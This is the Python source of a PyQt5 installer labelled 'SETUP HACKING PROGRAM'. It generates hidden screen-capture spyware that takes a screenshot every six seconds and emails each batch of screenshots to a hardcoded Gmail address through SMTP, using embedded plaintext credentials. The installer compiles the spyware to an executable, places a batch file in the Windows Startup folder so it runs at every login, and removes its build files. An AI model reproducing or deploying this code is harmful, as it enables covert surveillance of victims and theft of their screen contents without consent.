import sys
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QDialog, QApplication, QFileDialog, QProgressBar
from PyQt5.uic import loadUi
import os
import time
import PyInstaller.__main__
import shutil

def createsetuptxt():
    textfile = open("setup.txt", "w")
    textfile.write('\
<?xml version="1.0" encoding="UTF-8"?>\n\
<ui version="4.0">\n\
 <class>Dialog</class>\n\
 <widget class="QDialog" name="Dialog">\n\
  <property name="geometry">\n\
   <rect>\n\
    <x>0</x>\n\
    <y>0</y>\n\
    <width>799</width>\n\
    <height>600</height>\n\
   </rect>\n\
  </property>\n\
  <property name="windowTitle">\n\
   <string>Dialog</string>\n\
  </property>\n\
  <widget class="QLineEdit" name="lineEdit">\n\
   <property name="geometry">\n\
    <rect>\n\
     <x>30</x>\n\
     <y>360</y>\n\
     <width>561</width>\n\
     <height>31</height>\n\
    </rect>\n\
   </property>\n\
   <property name="font">\n\
    <font>\n\
     <family>MS Shell Dlg 2</family>\n\
     <pointsize>12</pointsize>\n\
     <weight>9</weight>\n\
     <italic>false</italic>\n\
     <bold>false</bold>\n\
    </font>\n\
   </property>\n\
   <property name="autoFillBackground">\n\
    <bool>false</bool>\n\
   </property>\n\
   <property name="styleSheet">\n\
    <string notr="true">QLineEdit {\n\
	border: 4px solid red;\n\
	border-radius: 10px;\n\
	background-color: qlineargradient(spread:pad, x1:0.995025, y1:1, x2:0, y2:0, stop:0 rgba(90, 198, 255, 255), stop:1 rgba(255, 255, 255, 255));\n\
	font: 75 12pt &quot;MS Shell Dlg 2&quot;;\n\
	color: red;\n\
}\n\
QLineEdit:focus {\n\
	background:qlineargradient(spread:pad, x1:0.523, y1:0, x2:0.507, y2:1, stop:0 rgba(158, 99, 255, 255), stop:1 rgba(85, 255, 151, 255));\n\
}</string>\n\
   </property>\n\
   <property name="placeholderText">\n\
    <string>C:/</string>\n\
   </property>\n\
  </widget>\n\
  <widget class="QPushButton" name="browse">\n\
   <property name="geometry">\n\
    <rect>\n\
     <x>620</x>\n\
     <y>360</y>\n\
     <width>141</width>\n\
     <height>31</height>\n\
    </rect>\n\
   </property>\n\
   <property name="cursor">\n\
    <cursorShape>PointingHandCursor</cursorShape>\n\
   </property>\n\
   <property name="styleSheet">\n\
    <string notr="true">QPushButton{\n\
	font: 12pt &quot;Palatino Linotype&quot;;\n\
	color: red;\n\
	background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(190, 164, 224, 255), stop:1 rgba(255, 255, 255, 255));\n\
	border: 4px solid red;\n\
	border-radius: 10px;\n\
}\n\
QPushButton:hover{\n\
	background-color: qlineargradient(spread:pad, x1:0.995025, y1:1, x2:0, y2:0, stop:0 rgba(93, 255, 0, 255), stop:1 rgba(255, 255, 255, 255));\n\
}</string>\n\
   </property>\n\
   <property name="text">\n\
    <string>BROWSE</string>\n\
   </property>\n\
  </widget>\n\
  <widget class="QPushButton" name="setupbtn">\n\
   <property name="enabled">\n\
    <bool>false</bool>\n\
   </property>\n\
   <property name="geometry">\n\
    <rect>\n\
     <x>450</x>\n\
     <y>530</y>\n\
     <width>141</width>\n\
     <height>41</height>\n\
    </rect>\n\
   </property>\n\
   <property name="cursor">\n\
    <cursorShape>PointingHandCursor</cursorShape>\n\
   </property>\n\
   <property name="styleSheet">\n\
    <string notr="true">QPushButton{\n\
	font: 15pt &quot;Palatino Linotype&quot;;\n\
	color: red;\n\
	background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(190, 164, 224, 255), stop:1 rgba(255, 255, 255, 255));\n\
	border: 4px solid red;\n\
	border-radius: 10px;\n\
}\n\
QPushButton:hover{\n\
	background-color: qlineargradient(spread:pad, x1:0.995025, y1:1, x2:0, y2:0, stop:0 rgba(93, 255, 0, 255), stop:1 rgba(255, 255, 255, 255));\n\
}</string>\n\
   </property>\n\
   <property name="text">\n\
    <string>SETUP</string>\n\
   </property>\n\
  </widget>\n\
  <widget class="QPushButton" name="finish">\n\
   <property name="enabled">\n\
    <bool>false</bool>\n\
   </property>\n\
   <property name="geometry">\n\
    <rect>\n\
     <x>620</x>\n\
     <y>530</y>\n\
     <width>141</width>\n\
     <height>41</height>\n\
    </rect>\n\
   </property>\n\
   <property name="cursor">\n\
    <cursorShape>PointingHandCursor</cursorShape>\n\
   </property>\n\
   <property name="styleSheet">\n\
    <string notr="true">QPushButton{\n\
	font: 15pt &quot;Palatino Linotype&quot;;\n\
	color: red;\n\
	background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(190, 164, 224, 255), stop:1 rgba(255, 255, 255, 255));\n\
	border: 4px solid red;\n\
	border-radius: 10px;\n\
}\n\
QPushButton:hover{\n\
	background-color: qlineargradient(spread:pad, x1:0.995025, y1:1, x2:0, y2:0, stop:0 rgba(93, 255, 0, 255), stop:1 rgba(255, 255, 255, 255));\n\
}</string>\n\
   </property>\n\
   <property name="text">\n\
    <string>FINISH</string>\n\
   </property>\n\
  </widget>\n\
  <widget class="QPlainTextEdit" name="plainTextEdit">\n\
   <property name="geometry">\n\
    <rect>\n\
     <x>20</x>\n\
     <y>86</y>\n\
     <width>761</width>\n\
     <height>151</height>\n\
    </rect>\n\
   </property>\n\
   <property name="font">\n\
    <font>\n\
     <family>Palatino Linotype</family>\n\
     <pointsize>28</pointsize>\n\
     <weight>50</weight>\n\
     <italic>false</italic>\n\
     <bold>false</bold>\n\
    </font>\n\
   </property>\n\
   <property name="layoutDirection">\n\
    <enum>Qt::LeftToRight</enum>\n\
   </property>\n\
   <property name="autoFillBackground">\n\
    <bool>false</bool>\n\
   </property>\n\
   <property name="styleSheet">\n\
    <string notr="true">font: 28pt &quot;Palatino Linotype&quot;;\n\
color: red;\n\
background-color: qlineargradient(spread:pad, x1:0.995025, y1:1, x2:0, y2:0, stop:0 rgba(90, 198, 255, 255), stop:1 rgba(255, 255, 255, 255));\n\
border: 4px solid red;\n\
border-radius: 10px;</string>\n\
   </property>\n\
   <property name="midLineWidth">\n\
    <number>0</number>\n\
   </property>\n\
   <property name="tabChangesFocus">\n\
    <bool>false</bool>\n\
   </property>\n\
   <property name="readOnly">\n\
    <bool>true</bool>\n\
   </property>\n\
   <property name="plainText">\n\
    <string>    SETUP HACKING PROGRAM\n\
		 CREATED BY HDT</string>\n\
   </property>\n\
   <property name="backgroundVisible">\n\
    <bool>false</bool>\n\
   </property>\n\
   <property name="centerOnScroll">\n\
    <bool>false</bool>\n\
   </property>\n\
  </widget>\n\
  <widget class="QProgressBar" name="progressBar">\n\
   <property name="geometry">\n\
    <rect>\n\
     <x>30</x>\n\
     <y>440</y>\n\
     <width>741</width>\n\
     <height>31</height>\n\
    </rect>\n\
   </property>\n\
   <property name="font">\n\
    <font>\n\
     <pointsize>14</pointsize>\n\
    </font>\n\
   </property>\n\
   <property name="cursor">\n\
    <cursorShape>ArrowCursor</cursorShape>\n\
   </property>\n\
   <property name="styleSheet">\n\
    <string notr="true">QProgressBar{\n\
	border: 4px solid red;\n\
	border-radius: 10px;\n\
	background-color: qlineargradient(spread:pad, x1:0.995025, y1:1, x2:0, y2:0, stop:0 rgba(90, 198, 255, 255), stop:1 rgba(255, 255, 255, 255));\n\
	color: red;\n\
}\n\
QProgressBar::chunk {\n\
	background:qlineargradient(spread:pad, x1:0.523, y1:0, x2:0.507, y2:1, stop:0 rgba(158, 99, 255, 255), stop:1 rgba(85, 255, 151, 255));\n\
	border-radius: 5px;\n\
}\n\
</string>\n\
   </property>\n\
   <property name="minimum">\n\
    <number>0</number>\n\
   </property>\n\
   <property name="value">\n\
    <number>0</number>\n\
   </property>\n\
   <property name="format">\n\
    <string>                                                   %p%</string>\n\
   </property>\n\
  </widget>\n\
  <widget class="QWidget" name="widget" native="true">\n\
   <property name="geometry">\n\
    <rect>\n\
     <x>0</x>\n\
     <y>0</y>\n\
     <width>801</width>\n\
     <height>601</height>\n\
    </rect>\n\
   </property>\n\
   <property name="styleSheet">\n\
    <string notr="true">background-color:qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 rgba(164, 224, 199, 255), stop:1 rgba(255, 255, 255, 255))</string>\n\
   </property>\n\
  </widget>\n\
  <zorder>widget</zorder>\n\
  <zorder>lineEdit</zorder>\n\
  <zorder>browse</zorder>\n\
  <zorder>setupbtn</zorder>\n\
  <zorder>finish</zorder>\n\
  <zorder>plainTextEdit</zorder>\n\
  <zorder>progressBar</zorder>\n\
 </widget>\n\
 <resources/>\n\
 <connections/>\n\
</ui>\n\
')
createsetuptxt()

def createsetupui():
    os.replace(f"setup.txt", f"setup.ui")
createsetupui()

class MainWindow(QDialog):
    
    def __init__(self):
        super(MainWindow,self).__init__()
        loadUi("setup.ui",self)
        self.browse.clicked.connect(self.browsefiles)
        self.setupbtn.clicked.connect(self.setup)
        self.finish.clicked.connect(self.replaced)
    
    def browsefiles(self):
        fname = str(QFileDialog.getExistingDirectory(self, "Select Directory"))
        self.lineEdit.setText(fname)
        if len(fname) != 0:
            self.setupbtn.setEnabled(True)

    def setup(self):
        directory = str(self.lineEdit.text())
        textfile = open("nothing.txt", "w")
        textfile.write(f'cd "{directory}"\nstart hackscreenshot.exe')

        def createhackscreenshottxt():
            textfile = open("hackscreenshot.txt", "w")
            textfile.write('\
import time\n\
import os\n\
import smtplib\n\
import ssl\n\
from email.mime.text import MIMEText\n\
from email.utils import formataddr\n\
from email.mime.multipart import MIMEMultipart\n\
from email.mime.base import MIMEBase\n\
from email import encoders\n\
from mss import mss\n\
def send_email() :\n\
    sender_email = "21522104@gm.uit.edu.vn"\n\
    sender_name = "VHH"\n\
    password = "Huyhoangdeptrai2003"\n\
    receiver_emails = ["21522104@gm.uit.edu.vn"]\n\
    receiver_names = ["VHH"]\n\
    filename0 = "picture/0.png"\n\
    filename1 = "picture/1.png"\n\
    filename2 = "picture/2.png"\n\
    filename3 = "picture/3.png"\n\
    filename4 = "picture/4.png"\n\
    filename5 = "picture/5.png"\n\
    filename6 = "picture/6.png"\n\
    filename7 = "picture/7.png"\n\
    filename8 = "picture/8.png"\n\
    filename9 = "picture/9.png"\n\
    filename10 = "picture/10.png"\n\
    listfile = [filename0,filename1,filename2,filename3,filename4,filename5,filename6,filename7,filename8,filename9,filename10]\n\
    for receiver_email, receiver_name in zip(receiver_emails, receiver_names):\n\
        print("Sending the email...")\n\
        msg = MIMEMultipart()\n\
        msg["To"] = formataddr((receiver_name, receiver_email))\n\
        msg["From"] = formataddr((sender_name, sender_email))\n\
        msg["Subject"] = "Hello, my friend" + receiver_name\n\
        for i in listfile :\n\
            try:\n\
                with open(f"{i}", "rb") as attachment:\n\
                    part = MIMEBase("application", "octet-stream")\n\
                    part.set_payload(attachment.read())\n\
                encoders.encode_base64(part)\n\
                part.add_header(\n\
                    "Content-Disposition",\n\
                    f"attachment; filename= {i}",\n\
                )\n\
                msg.attach(part)\n\
            except Exception as e:\n\
                print(f"Oh no! We didnt found the attachment!n{e}")\n\
                break\n\
        try:\n\
            server = smtplib.SMTP("smtp.gmail.com", 587)\n\
            context = ssl.create_default_context()\n\
            server.starttls(context=context)\n\
            server.login(sender_email, password)\n\
            server.sendmail(sender_email, receiver_email, msg.as_string())\n\
            print("Email sent!")\n\
        except Exception as e:\n\
            print(f"Oh no! Something bad happened!n{e}")\n\
            break\n\
        finally:\n\
            print("Closing the server...")\n\
            server.quit()\n\
send_email()\n\
img_counter = 0\n\
while True :\n\
    with mss() as sct:\n\
        sct.shot()\n\
        print({img_counter})\n\
    os.replace(f"monitor-1.png", f"picture/{img_counter}.png")\n\
    img_counter += 1\n\
    if img_counter == 11 :\n\
        send_email()\n\
        img_counter = 0\n\
    time.sleep(6)\n\
')
        createhackscreenshottxt()

        for i in range(90):
            self.progressBar.setValue(i+1)
            time.sleep(0.01)

        os.replace(f"hackscreenshot.txt", f"hackscreenshot.pyw")

        def pywtoexe():
            PyInstaller.__main__.run([
                '--one file',
                'windowed',
                'hackscreenshot.pyw',
            ])
        pywtoexe()

        for i in range(90,101):
            self.progressBar.setValue(i+1)
            time.sleep(0.1)

        self.finish.setEnabled(True)
        
    def replaced(self):
        os.remove("hackscreenshot.spec")
        os.remove("hackscreenshot.pyw")
        os.remove("setup.ui")
        directory = str(self.lineEdit.text())
        os.replace(f"nothing.txt", f"C:/Users/Admin/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/nothing.bat")
        os.replace(f"dist/hackscreenshot.exe", f"{directory}/hackscreenshot.exe")
        os.chdir(f"{directory}")
        os.mkdir("picture")
        pathfake = str(os.path.abspath(__file__))
        path = pathfake.split("\setup.pyw")
        pathreal = path[0]
        shutil.rmtree(f'{pathreal}/dist')
        shutil.rmtree(f'{pathreal}/build')
        shutil.rmtree(f'{pathreal}/__pycache__')
        sys.exit(app.exec_())

app = QApplication(sys.argv)
mainwindow = MainWindow()
widget = QtWidgets.QStackedWidget()
widget.addWidget(mainwindow)
widget.setFixedHeight(600)
widget.setFixedWidth(800)
widget.show()
sys.exit(app.exec_())
